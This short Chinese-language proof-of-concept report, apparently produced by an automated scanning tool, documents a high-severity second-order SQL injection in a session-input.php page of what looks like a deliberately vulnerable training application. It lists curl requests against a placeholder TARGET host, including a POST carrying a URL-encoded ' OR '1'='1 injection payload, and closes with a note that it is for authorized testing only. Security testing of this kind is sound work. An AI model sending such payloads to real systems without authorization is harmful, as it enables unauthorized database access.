# POC — 二次 SQL 注入：session-input.php 写入 $_SESSION['id']，sqli 模块读取后拼入查询

- finding_id: `LLM-fb23f3d9c630`
- type: `sql_injection` / CWE-89
- severity: `high`
- file: `vulnerabilities/sqli/session-input.php:14`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/vulnerabilities/sqli/session-input.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 SQL 注入 载荷**  
```http
curl -sS -i -X POST 'http://TARGET:8080/vulnerabilities/sqli/session-input.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'id=%27%20OR%20%271%27%3D%271'
```
预期：布尔条件改变响应内容/长度，或触发 SQL 报错、时间延迟。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。